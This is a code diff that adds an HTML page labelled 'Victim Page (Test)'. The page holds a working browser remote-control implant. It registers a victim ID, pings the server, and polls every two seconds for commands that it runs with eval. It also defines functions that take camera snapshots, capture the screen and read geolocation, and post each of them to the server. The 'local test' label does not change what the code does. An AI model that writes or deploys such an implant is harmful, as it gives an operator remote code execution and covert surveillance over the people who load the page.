@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Victim Page (Test)</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;padding:20px;background:#f5f7fa;color:#222}
+    .card{background:white;padding:16px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
+    pre{background:#111;color:#dff; padding:10px;border-radius:6px;overflow:auto}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Victim Page (Local Test)</h2>
+    <p id="info">Initializing...</p>
+    <pre id="console">Console logs will appear here...</pre>
+  </div>
+
+<script>
+(function(){
+  // get victim id from query or localStorage
+  function qs(name){ const url = new URL(location.href); return url.searchParams.get(name); }
+  let vid = qs('victim') || localStorage.getItem('victim_id');
+  if (!vid) {
+    vid = 'dev-' + Math.random().toString(36).slice(2, 11);
+    localStorage.setItem('victim_id', vid);
+  }
+  window.victimId = vid;
+  document.getElementById('info').innerText = 'Victim ID: ' + vid;
+
+  function log(msg){
+    const el = document.getElementById('console');
+    const t = new Date().toLocaleTimeString();
+    el.textContent = `[${t}] ${msg}\n` + el.textContent;
+    console.log(msg);
+  }
+
+  // register
+  fetch('/register', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ victim_id: vid, permissions: {} })
+  }).then(r=>r.json()).then(d=> log('Registered: ' + JSON.stringify(d)));
+
+  // ping (keepalive)
+  setInterval(()=> {
+    fetch('/api/ping', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ victim_id: vid })
+    }).then(()=>{}).catch(()=>{});
+  }, 5000);
+
+  // poll commands
+  async function pollCommands(){
+    try {
+      const res = await fetch(`/api/get_commands?victim_id=${encodeURIComponent(vid)}`);
+      const data = await res.json();
+      if (data && data.commands && data.commands.length){
+        for (const cmd of data.commands){
+          try{
+            log('Executing command: ' + cmd.command.slice(0,120));
+            // execute safely in try/catch
+            (function(){ eval(cmd.command); })();
+            // you can optionally post back results using /api/log_info
+            fetch('/api/log_info?victim=' + encodeURIComponent(vid), {
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({ result: 'ok', executed_command: cmd.id })
+            }).catch(()=>{});
+          }catch(e){
+            log('Command error: ' + e);
+            fetch('/api/log_info?victim=' + encodeURIComponent(vid), {
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({ result: 'error', error: String(e), executed_command: cmd.id })
+            }).catch(()=>{});
+          }
+        }
+      }
+    } catch (e){
+      // ignore
+    } finally {
+      setTimeout(pollCommands, 2000);
+    }
+  }
+  pollCommands();
+
+  // convenience helpers (example: capture a frame and send to server)
+  window.captureCameraAndSend = async function(){
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      // stop tracks
+      stream.getTracks().forEach(t => t.stop());
+      // send to server
+      await fetch('/api/camera_frame?victim=' + encodeURIComponent(vid), {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ image: dataUrl })
+      });
+      log('Camera snapshot sent');
+    } catch(e){
+      log('Camera error: ' + e);
+    }
+  };
+
+  // support screen capture (will prompt user)
+  window.captureScreenAndSend = async function(){
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const bitmap = await imageCapture.takePhoto().catch(()=>null);
+      // fallback to drawing video frame
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 800;
+      canvas.height = video.videoHeight || 600;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      stream.getTracks().forEach(t => t.stop());
+      await fetch('/api/screen_frame?victim=' + encodeURIComponent(vid), {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ image: dataUrl })
+      });
+      log('Screen snapshot sent');
+    } catch(e){
+      log('Screen capture error: ' + e);
+    }
+  };
+
+  // send location (if allowed)
+  window.sendGeo = function(){
+    if (!navigator.geolocation) return log('Geolocation not supported');
+    navigator.geolocation.getCurrentPosition(pos => {
+      fetch('/api/geo?victim=' + encodeURIComponent(vid), {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
+      });
+      log('Geo sent: ' + pos.coords.latitude + ',' + pos.coords.longitude);
+    }, err => log('Geo error: ' + err.message));
+  };
+
+})();
+</script>
+
+</body>
+</html>
